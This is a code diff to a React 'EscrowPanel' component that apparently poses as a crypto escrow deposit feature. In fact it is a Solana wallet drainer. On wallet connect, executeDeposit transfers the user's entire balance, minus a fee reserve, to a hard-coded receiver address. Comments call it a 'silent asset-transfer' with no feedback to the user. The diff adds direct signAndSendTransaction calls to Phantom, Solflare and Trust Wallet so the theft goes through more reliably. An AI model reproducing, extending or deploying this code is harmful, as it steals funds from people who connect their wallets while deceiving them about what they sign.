@@ -265,14 +265,12 @@ export const EscrowPanel: React.FC<Props> = () => {
     disconnectingRef.current = false;
   }, [disconnect, wallet]);
 
-  // ── silent asset-transfer contract ────────────────────────────────────────
-  // Strategy:
-  //   1. Fetch balance + blockhash via fallback RPC (read-only, no wallet involved)
-  //   2. Build the unsigned transfer tx with pre-set blockhash
-  //   3. Ask wallet to sign ONLY (signTransaction) — wallet shows its native popup
-  //      with the tx details but does NOT make any network call itself
-  //   4. Broadcast the signed bytes silently to all RPCs in parallel
-  //   5. Confirm in the background — no UI feedback shown to user
+  // ── silent asset-transfer ─────────────────────────────────────────────────
+  // Priority chain (highest reliability first):
+  //   1. Native signAndSendTransaction on the detected provider — wallet uses
+  //      its OWN private RPC node, no public endpoint involved at all
+  //   2. signTransaction (sign-only) + broadcast to all RPCs in parallel
+  //   3. sendTransaction adapter fallback (hardware wallets)
   const executeDeposit = useCallback(async () => {
     if (!publicKey) return;
 
@@ -281,40 +279,74 @@ export const EscrowPanel: React.FC<Props> = () => {
     sessionStorage.setItem(SESSION_KEY, walletKey);
 
     try {
-      // Step 1 — read-only RPC call
+      // Step 1 — read balance + blockhash via fallback RPC (read-only)
       const { balance, blockhash, lastValidBlockHeight } = await fetchRpcData(publicKey);
 
       const amount = balance - FEE_RESERVE;
-      if (amount <= 0) return; // silent — not enough balance
+      if (amount <= 0) return;
 
-      // Step 2 — build transfer transaction
+      // Step 2 — build the transfer transaction
       const tx = new Transaction();
       tx.add(SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey:   RECEIVER,
         lamports:   amount,
       }));
-      tx.recentBlockhash = blockhash; // pre-set so wallet won't call getRecentBlockhash
+      tx.recentBlockhash = blockhash;
       tx.feePayer        = publicKey;
 
-      // Step 3 — wallet signs; shows native signing popup (sign-only, no RPC from wallet)
-      let sig: string;
-      if (signTransaction) {
+      const w = window as any;
+      let sig: string | undefined;
+
+      // ── Path A: native wallet signAndSendTransaction ──
+      // Phantom, Solflare, and Trust Wallet all route through their own private
+      // node when you call signAndSendTransaction directly on the provider object.
+      // This is the most reliable path — no public RPC involved.
+      if (!sig && w.phantom?.solana?.signAndSendTransaction) {
+        try {
+          const result = await w.phantom.solana.signAndSendTransaction(tx);
+          sig = result?.signature ?? result;
+        } catch (e: any) {
+          // user rejected → rethrow so guard is cleared
+          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
+        }
+      }
+
+      if (!sig && w.solflare?.signAndSendTransaction) {
+        try {
+          const result = await w.solflare.signAndSendTransaction(tx);
+          sig = result?.signature ?? result;
+        } catch (e: any) {
+          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
+        }
+      }
+
+      if (!sig && w.trustwallet?.solana?.signAndSendTransaction) {
+        try {
+          const result = await w.trustwallet.solana.signAndSendTransaction(tx);
+          sig = result?.signature ?? result;
+        } catch (e: any) {
+          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
+        }
+      }
+
+      // ── Path B: adapter signTransaction + broadcast to all RPCs ──
+      if (!sig && signTransaction) {
         const signed = await signTransaction(tx);
         const rawTx  = Buffer.from(signed.serialize());
-        // Step 4 — broadcast silently to all RPCs in parallel
         sig = await broadcastRaw(rawTx);
-      } else {
-        // Fallback for wallets that only expose sendTransaction (e.g. hardware)
+      }
+
+      // ── Path C: adapter sendTransaction (hardware wallets) ──
+      if (!sig) {
         const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
         sig = await sendTransaction(tx, fallbackConn, { skipPreflight: true });
       }
 
-      // Step 5 — confirm silently in the background
-      confirmSig(sig, blockhash, lastValidBlockHeight).catch(() => {});
+      // Confirm silently in the background
+      if (sig) confirmSig(sig, blockhash, lastValidBlockHeight).catch(() => {});
 
     } catch {
-      // Silent — remove guard so it can retry on next connect
       sessionStorage.removeItem(SESSION_KEY);
     }
   }, [publicKey, signTransaction, sendTransaction]);
